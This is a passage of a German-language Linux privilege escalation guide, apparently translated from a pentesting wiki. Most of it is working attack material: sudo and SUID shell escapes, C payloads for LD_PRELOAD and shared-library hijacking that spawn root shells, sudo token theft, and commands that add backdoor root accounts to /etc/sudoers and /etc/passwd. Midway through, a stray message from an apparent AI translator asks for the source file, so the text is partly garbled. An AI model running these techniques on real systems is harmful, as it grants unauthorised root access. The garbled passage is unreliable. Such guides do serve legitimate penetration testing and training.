cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Einige Linux-Versionen waren von einem Bug betroffen, der Benutzern mit **UID > INT_MAX** erlaubt, Privilegien zu eskalieren. Mehr Infos: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Ausnutzen** mit: **`systemd-run -t /bin/bash`**

### Gruppen

Prüfe, ob du **Mitglied einer Gruppe** bist, die dir root privileges gewähren könnte:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Prüfe, ob sich (falls möglich) etwas Interessantes in der Zwischenablage befindet
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwort-Richtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn du **ein Passwort** der Umgebung kennst, **versuche dich mit diesem Passwort als jeden Benutzer anzumelden**.

### Su Brute

Wenn es dir nichts ausmacht, viel Lärm zu verursachen, und die `su`- und `timeout`-Binaries auf dem Rechner vorhanden sind, kannst du versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) zu brute-forcen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) versucht mit dem `-a`-Parameter ebenfalls, Benutzer per Brute-Force anzugreifen.

## Missbrauch schreibbarer $PATHs

### $PATH

Wenn du feststellst, dass du **in einen Ordner des $PATH schreiben kannst**, kannst du möglicherweise Privilegien eskalieren, indem du **eine backdoor in dem schreibbaren Ordner erstellst** mit dem Namen eines Befehls, der von einem anderen Benutzer (idealerweise root) ausgeführt wird und **nicht aus einem Verzeichnis geladen wird, das in $PATH vor deinem schreibbaren Ordner liegt**.

### SUDO and SUID

Du könntest berechtigt sein, einen Befehl mit sudo auszuführen, oder dieser könnte das suid-Bit gesetzt haben. Überprüfe das mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle ermöglichen es Ihnen, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Die Sudo-Konfiguration kann einem user erlauben, einen command mit den Rechten eines anderen users auszuführen, ohne das password zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen; es ist nun trivial, eine shell zu erhalten, indem man einen ssh key in das root-Verzeichnis hinzufügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive erlaubt dem Benutzer, **eine environment variable zu setzen**, während etwas ausgeführt wird:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf der HTB machine Admirer**, war **anfällig** für **PYTHONPATH hijacking**, um eine beliebige python-Bibliothek zu laden, während das Skript als root ausgeführt wurde:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo: Pfade zur Umgehung der Ausführung

**Springe** um andere Dateien zu lesen oder benutze **symlinks**. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary ohne Befehlspfad

Wenn die **sudo-Berechtigung** für einen einzelnen Befehl **ohne Angabe des Pfads** vergeben ist: _hacker10 ALL= (root) less_ kann man dies ausnutzen, indem man die PATH-Variable ändert.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn ein **suid** binary **einen anderen Befehl ausführt, ohne den Pfad anzugeben (prüfe immer mit** _**strings**_ **den Inhalt einer merkwürdigen SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary mit angegebenem Befehls-Pfad

Wenn die **suid** binary **einen anderen Befehl ausführt und dabei den Pfad angibt**, kannst du versuchen, **eine Funktion zu exportieren**, die den Namen des Befehls trägt, den die suid file aufruft.

Zum Beispiel: Wenn ein suid binary _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wenn Sie dann das suid-Binary aufrufen, wird diese Funktion ausgeführt

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere shared libraries (.so-Dateien) anzugeben, die vom Loader vor allen anderen geladen werden sollen, einschließlich der Standard-C-Bibliothek (`libc.so`). Dieser Vorgang ist als Preloading einer Bibliothek bekannt.

Um jedoch die Systemsicherheit zu gewährleisten und zu verhindern, dass diese Funktion missbraucht wird, insbesondere bei suid/sgid-Executables, erzwingt das System bestimmte Bedingungen:

- Der Loader ignoriert **LD_PRELOAD** für Executables, bei denen die real user ID (_ruid_) nicht mit der effective user ID (_euid_) übereinstimmt.
- Bei Executables mit suid/sgid werden nur Bibliotheken aus Standardpfaden vorab geladen, die ebenfalls suid/sgid sind.

Privilege escalation kann auftreten, wenn Sie die Möglichkeit haben, Befehle mit `sudo` auszuführen und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration erlaubt es, dass die Umgebungsvariable **LD_PRELOAD** auch beim Ausführen von Befehlen mit `sudo` erhalten bleibt und erkannt wird, was potenziell zur Ausführung von beliebigem Code mit erhöhten Rechten führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Speichere als **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompiliere es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich **escalate privileges** ausführen
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Eine ähnliche privesc kann ausgenutzt werden, wenn der Angreifer die **LD_LIBRARY_PATH** Umgebungsvariable kontrolliert, da er den Pfad kontrolliert, in dem Bibliotheken gesucht werden.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wenn man auf ein binary mit **SUID**-Rechten stößt, das ungewöhnlich erscheint, ist es gute Praxis zu überprüfen, ob es **.so**-Dateien korrekt lädt. Das lässt sich überprüfen, indem man folgenden Befehl ausführt:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Wenn man beispielsweise auf einen Fehler wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ stößt, deutet das auf einen möglichen Exploit hin.

Um dies zu exploit, erstellt man eine C-Datei, z. B. _"/path/to/.config/libcalc.c"_, die folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code zielt, einmal kompiliert und ausgeführt, darauf ab, Privilegien zu eskalieren, indem Dateiberechtigungen manipuliert und eine Shell mit erhöhten Rechten gestartet wird.

Kompiliere die obige C-Datei in eine shared object (.so) Datei mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen der betroffenen SUID binary den Exploit auslösen und eine mögliche Kompromittierung des Systems ermöglichen.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Da wir nun ein SUID binary gefunden haben, das eine library aus einem Verzeichnis lädt, in das wir schreiben können, erstellen wir die library in diesem Verzeichnis mit dem notwendigen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn Sie einen Fehler wie den folgenden erhalten:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
das bedeutet, dass die Bibliothek, die du erzeugt hast, eine Funktion namens `a_function_name` haben muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binaries, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe, aber für Fälle, in denen du in einem Befehl **nur Argumente injizieren** kannst.

Das Projekt sammelt legitime Funktionen von Unix-Binaries, die missbraucht werden können, um eingeschränkte Shells zu verlassen, Privilegien zu eskalieren oder beizubehalten, Dateien zu übertragen, bind and reverse shells zu starten und andere Post-Exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Wenn du `sudo -l` ausführen kannst, kannst du das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es einen Weg findet, eine sudo-Regel auszunutzen.

### Reusing Sudo Tokens

In Fällen, in denen du **sudo access** hast, aber nicht das Passwort, kannst du Privilegien eskalieren, indem du darauf wartest, dass ein sudo-Befehl ausgeführt wird, und dann das Session-Token kaperst.

Voraussetzungen für die Privilegieneskalation:

- Du hast bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat **`sudo` verwendet**, um in den **letzten 15 Minuten** etwas auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, die es uns erlaubt, `sudo` zu benutzen ohne ein Passwort einzugeben)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist verfügbar (du kannst es hochladen)

(Du kannst `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft `/etc/sysctl.d/10-ptrace.conf` ändern und `kernel.yama.ptrace_scope = 0` setzen)

Wenn alle diese Voraussetzungen erfüllt sind, **kannst du Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **erste Exploit** (`exploit.sh`) erstellt das Binary `activate_sudo_token` in _/tmp_. Du kannst es benutzen, um das **sudo-Token in deiner Session zu aktivieren** (du erhältst nicht automatisch eine root-Shell, führe `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Der **zweite exploit** (`exploit_v2.sh`) wird eine sh shell in _/tmp_ erstellen, die **root gehört und mit setuid versehen** ist.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte exploit** (`exploit_v3.sh`) wird eine **sudoers file** erstellen, die **sudo tokens dauerhaft macht und allen Benutzern erlaubt, sudo zu verwenden**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn Sie **Schreibrechte** im Ordner oder an einer der darin erstellten Dateien haben, können Sie das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **ein sudo-Token für einen Benutzer und eine PID zu erstellen**.\
Zum Beispiel, wenn Sie die Datei _/var/run/sudo/ts/sampleuser_ überschreiben können und eine Shell als dieser Benutzer mit PID 1234 haben, können Sie **sudo-Privilegien erlangen**, ohne das Passwort zu kennen, indem Sie:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien in `/etc/sudoers.d` legen fest, wer `sudo` verwenden darf und wie. Diese Dateien **können standardmäßig nur vom Benutzer root und der Gruppe root gelesen werden**.\
**Wenn** Sie diese Datei **lesen** können, könnten Sie **einige interessante Informationen erhalten**, und wenn Sie irgendeine Datei **schreiben** können, werden Sie in der Lage sein, **Privilegien zu eskalieren**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn du schreiben kannst, kannst du diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine andere Möglichkeit, diese Berechtigungen zu missbrauchen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zur `sudo` binary, wie z. B. `doas` für OpenBSD. Überprüfe dessen Konfiguration unter `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn du weißt, dass ein **Benutzer normalerweise eine Verbindung zu einer Maschine herstellt und `sudo` verwendet**, um Privilegien zu erhöhen, und du eine Shell in diesem Benutzerkontext erhalten hast, kannst du **create a new sudo executable** erstellen, die zuerst deinen Code als root und anschließend den Befehl des Benutzers ausführt. Dann **modify the $PATH** des Benutzerkontexts (zum Beispiel indem du den neuen Pfad in .bash_profile hinzufügst), sodass beim Ausführen von sudo deine sudo executable ausgeführt wird.

Beachte, dass wenn der Benutzer eine andere Shell (nicht bash) verwendet, du andere Dateien anpassen musst, um den neuen Pfad hinzuzufügen. Zum Beispiel[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifiziert `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ein weiteres Beispiel findest du in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder so etwas ausführen:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gemeinsame Bibliothek

### ld.so

Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei den folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` eingelesen werden. Diese Konfigurationsdateien **verweisen auf andere Ordner**, in denen nach **Bibliotheken** gesucht wird. Zum Beispiel ist der Inhalt von `/etc/ld.so.conf.d/libc.conf` `/usr/local/lib`. **Das bedeutet, dass das System nach Bibliotheken innerhalb von `/usr/local/lib` suchen wird**.

Wenn aus irgendeinem Grund **ein Benutzer Schreibrechte** auf einem der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, auf eine Datei innerhalb von `/etc/ld.so.conf.d/` oder auf einen Ordner, auf den in einer der Konfigurationsdateien in `/etc/ld.so.conf.d/*.conf` verwiesen wird, könnte er möglicherweise Privilegien eskalieren.\
Sieh dir an, **wie man diese Fehlkonfiguration ausnutzt** auf der folgenden Seite:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Wenn man die lib nach `/var/tmp/flag15/` kopiert, wird sie an dieser Stelle vom Programm wie in der `RPATH`-Variable angegeben verwendet.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Erstelle dann eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Fähigkeiten

Linux-Capabilities stellen einem Prozess eine **Teilmenge der verfügbaren root-Privilegien** zur Verfügung. Dadurch werden die root-**Privilegien in kleinere und voneinander unterscheidbare Einheiten aufgeteilt**. Jede dieser Einheiten kann dann Prozessen unabhängig gewährt werden. Auf diese Weise wird die vollständige Menge an Privilegien reduziert, wodurch das Risiko einer Ausnutzung verringert wird.\
Lies die folgende Seite, um **mehr über Capabilities und deren Missbrauch zu erfahren**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Verzeichnisberechtigungen

In einem Verzeichnis bedeutet das **Bit für "execute"**, dass der betroffene Benutzer mit "**cd**" in das Verzeichnis wechseln kann.\
Das **"read"**-Bit bedeutet, der Benutzer kann **die Dateien auflisten**, und das **"write"**-Bit bedeutet, der Benutzer kann **Dateien löschen** und **neue Dateien erstellen**.

## ACLs

Access Control Lists (ACLs) stellen die sekundäre Ebene der diskretionären Berechtigungen dar und können die traditionellen ugo/rwx-Berechtigungen **überschreiben**. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die weder Eigentümer noch Gruppenmitglieder sind, Rechte gewähren oder verweigern. Dieses Maß an **Granularität sorgt für eine präzisere Zugriffsverwaltung**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gib** dem Benutzer "kali" Lese- und Schreibrechte für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Abrufen** von Dateien mit bestimmten ACLs vom System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Offene shell sessions

In **älteren Versionen** kannst du möglicherweise einige **shell** sessions eines anderen Benutzers (**root**) **hijack**.\
In **neuesten Versionen** kannst du dich nur mit screen sessions deines **eigenen Benutzers** **verbinden**. Allerdings könntest du **interessante Informationen innerhalb der Session** finden.

### screen sessions hijacking

**screen sessions auflisten**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**An eine Sitzung anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Das war ein Problem mit **älteren tmux-Versionen**. Ich konnte eine von root erstellte tmux (v2.1)-Session als nicht-privilegierter Benutzer nicht hijacken.

**tmux-Sessions auflisten**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**An eine session anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Siehe die **Valentine box von HTB** als Beispiel.

## SSH

### Debian OpenSSL vorhersagbarer PRNG - CVE-2008-0166

Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu, etc.) zwischen September 2006 und dem 13. Mai 2008 erzeugt wurden, können von diesem Bug betroffen sein.\
Dieser Bug tritt beim Erzeugen eines neuen ssh-Schlüssels auf diesen OS auf, da **nur 32.768 Variationen möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und dass man **mit dem ssh public key den entsprechenden private key suchen kann**. Die berechneten Möglichkeiten finden Sie hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante Konfigurationswerte

- **PasswordAuthentication:** Legt fest, ob Passwort-Authentifizierung erlaubt ist. Die Standardeinstellung ist `no`.
- **PubkeyAuthentication:** Legt fest, ob Public-Key-Authentifizierung erlaubt ist. Die Standardeinstellung ist `yes`.
- **PermitEmptyPasswords**: Wenn Passwort-Authentifizierung erlaubt ist, legt es fest, ob der Server Logins zu Konten mit leeren Passwortstrings zulässt. Die Standardeinstellung ist `no`.

### PermitRootLogin

Legt fest, ob root sich per ssh anmelden darf; Standard ist `no`. Mögliche Werte:

- `yes`: root kann sich mit Passwort und private key anmelden
- `without-password` oder `prohibit-password`: root kann sich nur mit einem private key anmelden
- `forced-commands-only`: root kann sich nur mit einem private key anmelden und nur, wenn die command-Optionen angegeben sind
- `no`: nein

### AuthorizedKeysFile

Gibt Dateien an, die die public keys enthalten, die zur Benutzer-Authentifizierung verwendet werden können. Sie kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Sie können absolute Pfade angeben** (beginnend mit `/`) oder **relative Pfade vom Home des Benutzers aus**. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration zeigt an, dass, wenn du versuchst, dich mit dem **private** key des Benutzers "**testusername**" einzuloggen, ssh den public key deines key mit denen in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` vergleichen wird.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding erlaubt es dir, **use your local SSH keys instead of leaving keys** (without passphrases!) auf deinem Server liegen zu lassen. Dadurch wirst du in der Lage sein, via ssh **jump** **to a host** und von dort **jump to another** host **using** den **key**, der in deinem **initial host** liegt.

Du musst diese Option in `$HOME/.ssh.config` wie folgt setzen:
```
Host example.com
ForwardAgent yes
```
Beachte, dass wenn `Host` auf `*` gesetzt ist, jedes Mal wenn der Benutzer zu einer anderen Maschine wechselt, dieser Host auf die Schlüssel zugreifen kann (was ein Sicherheitsproblem darstellt).

Die Datei `/etc/ssh_config` kann diese **Optionen** **überschreiben** und diese Konfiguration erlauben oder verhindern.  
Die Datei `/etc/sshd_config` kann ssh-agent forwarding mit dem Schlüsselwort `AllowAgentForwarding` erlauben oder verhindern (standardmäßig erlaubt).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, da **du es möglicherweise ausnutzen kannst, um Privilegien zu eskalieren**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profil-Dateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher, wenn du eine von ihnen **schreiben oder ändern kannst, kannst du Privilegien eskalieren**.
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **sensitive details**.

### Passwd/Shadow Files

Wenn ein ungewöhnliches Profilskript gefunden wird, solltest du es auf **sensible Details** prüfen.

Je nach OS können die `/etc/passwd`- und `/etc/shadow`-Dateien einen anderen Namen haben oder es könnte eine Sicherungskopie geben. Daher wird empfohlen, **alle zu finden** und **zu prüfen, ob du sie lesen kannst**, um zu sehen, **ob sich hashes** in den Dateien befinden:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In einigen Fällen kann man **password hashes** in der Datei `/etc/passwd` (oder einer entsprechenden) finden.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Beschreibbare /etc/passwd

Erzeuge zunächst ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ich habe die Datei src/linux-hardening/privilege-escalation/README.md nicht erhalten. Bitte füge den Inhalt hier ein, damit ich den relevanten englischen Text ins Deutsche übersetze und die Markdown-/HTML-Syntax unverändert lasse.

Zur Anmerkung "Dann add the user `hacker` and add the generated password.": Soll das als:
- eine dokumentierte Anweisung/Beispiel im README (z. B. ein Codeblock mit useradd- und passwd-Befehlen), oder
- eine Zeile in der Datei, die den Benutzer und das generierte Passwort aufführt?

Und welche Anforderungen soll das Passwort haben (Länge, Zeichensatz)? Wenn du nichts angibst, generiere ich ein sicheres zufälliges Passwort (z. B. 16 Zeichen, Groß-/Kleinbuchstaben, Zahlen, Sonderzeichen) und füge es an der gewünschten Stelle hinzu.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Z. B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Du kannst jetzt den `su`-Befehl mit `hacker:hacker` verwenden.

Alternativ kannst du die folgenden Zeilen verwenden, um einen Dummy-User ohne Passwort hinzuzufügen.\
WARNUNG: Dies kann die aktuelle Sicherheit der Maschine beeinträchtigen.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` unter `/etc/pwd.db` und `/etc/master.passwd`, außerdem wurde `/etc/shadow` in `/etc/spwd.db` umbenannt.

Du solltest prüfen, ob du in einige **sensible Dateien** schreiben kannst. Zum Beispiel: Kannst du in eine **Service-Konfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel: Wenn die Maschine einen **tomcat**-Server ausführt und du die **Tomcat service configuration file inside /etc/systemd/** ändern kannst, dann kannst du die folgenden Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Deine backdoor wird beim nächsten Start von tomcat ausgeführt.

### Ordner überprüfen

Die folgenden Ordner können Sicherungen oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich kannst du den letzten nicht lesen, aber versuche es.)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Merkwürdige Speicherorte/Owned-Dateien
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
